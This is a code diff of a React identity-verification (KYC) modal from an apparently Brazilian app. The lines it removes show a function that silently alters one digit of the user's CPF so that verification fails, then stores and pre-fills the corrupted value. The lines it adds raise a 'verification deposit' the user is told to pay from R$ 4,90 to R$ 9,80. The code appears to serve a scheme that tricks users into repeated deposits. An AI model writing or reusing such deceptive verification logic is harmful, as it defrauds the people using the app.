@@ -29,35 +29,14 @@ export const KYCVerificationModal: React.FC<KYCVerificationModalProps> = ({
 
   useEffect(() => {
     if (isOpen) {
-      if (kycStatus.identityVerified && !kycStatus.depositVerified && !kycStatus.hasFailedFirstAttempt) {
+      if (kycStatus.identityVerified && !kycStatus.depositVerified) {
         setCurrentStep(2);
-      } else if (!kycStatus.identityVerified || kycStatus.hasFailedFirstAttempt) {
+      } else if (!kycStatus.identityVerified) {
         setCurrentStep(1);
       }
 
       // Pré-carregar dados anteriores
-      if (kycStatus.cpf && kycStatus.fullName && kycStatus.birthDate && kycStatus.hasFailedFirstAttempt) {
-        // Se já tem CPF com erro salvo, usar ele. Caso contrário, gerar novo erro
-        let cpfWithError;
-        if (kycStatus.cpfWithError) {
-          // Usar o CPF com erro já gerado anteriormente
-          cpfWithError = kycStatus.cpfWithError;
-        } else {
-          // Gerar erro pela primeira vez e salvar
-          cpfWithError = introduceCPFError(kycStatus.cpf);
-          // Atualizar o KYC com o CPF com erro para persistir
-          onUpdateKYC({
-            ...kycStatus,
-            cpfWithError: cpfWithError
-          });
-        }
-        setFormData({
-          cpf: cpfWithError,
-          fullName: kycStatus.fullName,
-          birthDate: kycStatus.birthDate
-        });
-      } else if (kycStatus.cpf && kycStatus.fullName && kycStatus.birthDate) {
-        // Se já tem dados mas não falhou, carregar normalmente
+      if (kycStatus.cpf && kycStatus.fullName && kycStatus.birthDate) {
         setFormData({
           cpf: kycStatus.cpf,
           fullName: kycStatus.fullName,
@@ -73,26 +52,6 @@ export const KYCVerificationModal: React.FC<KYCVerificationModalProps> = ({
     }
   }, [isOpen, kycStatus, onUpdateKYC]);
 
-  // Funcao para introduzir erro sutil no CPF
-  const introduceCPFError = (cpf: string): string => {
-    if (!cpf || cpf.length < 11) return cpf;
-
-    const cleaned = cpf.replace(/\D/g, '');
-    if (cleaned.length !== 11) return cpf;
-
-    // Escolher posição aleatória (evitar os dois ultimos digitos verificadores)
-    const positions = [0, 1, 2, 3, 4, 5, 6, 7, 8];
-    const randomPos = positions[Math.floor(Math.random() * positions.length)];
-
-    // Trocar digito por outro diferente
-    const chars = cleaned.split('');
-    const currentDigit = parseInt(chars[randomPos]);
-    const newDigit = (currentDigit + Math.floor(Math.random() * 8) + 1) % 10;
-    chars[randomPos] = newDigit.toString();
-
-    const errorCPF = chars.join('');
-    return formatCPF(errorCPF);
-  };
 
   if (!isOpen) return null;
 
@@ -168,9 +127,7 @@ export const KYCVerificationModal: React.FC<KYCVerificationModalProps> = ({
         cpf: formData.cpf,
         fullName: formData.fullName,
         birthDate: formData.birthDate,
-        depositAttempts: kycStatus.depositAttempts || 0,
-        hasFailedFirstAttempt: false,
-        cpfWithError: undefined
+        depositAttempts: kycStatus.depositAttempts || 0
       };
       onUpdateKYC(updatedKYC);
       setCurrentStep(2);
@@ -272,7 +229,7 @@ export const KYCVerificationModal: React.FC<KYCVerificationModalProps> = ({
             </div>
           </div>
 
-          {currentStep === 1 && ((!kycStatus.identityVerified) || (kycStatus.hasFailedFirstAttempt)) ? (
+          {currentStep === 1 && !kycStatus.identityVerified ? (
             <div className="space-y-3">
 
               <div>
@@ -350,7 +307,7 @@ export const KYCVerificationModal: React.FC<KYCVerificationModalProps> = ({
                 </p>
 
                 <div className="bg-accent/10 rounded-lg p-3 mb-3 border border-accent/30">
-                  <div className="text-accent text-2xl font-bold mb-1 text-center">R$ 4,90</div>
+                  <div className="text-accent text-2xl font-bold mb-1 text-center">R$ 9,80</div>
                   <p className="text-gray-400 text-[10px] text-center">Deposito de verificacao</p>
                 </div>
 
@@ -360,7 +317,7 @@ export const KYCVerificationModal: React.FC<KYCVerificationModalProps> = ({
                     <div>
                       <h4 className="text-green-300 font-bold text-xs mb-1">O valor sera creditado</h4>
                       <p className="text-green-200 text-[10px] leading-relaxed">
-                        Os R$ 4,90 serao adicionados ao seu saldo apos a verificacao
+                        Os R$ 9,80 serao adicionados ao seu saldo apos a verificacao
                       </p>
                     </div>
                   </div>
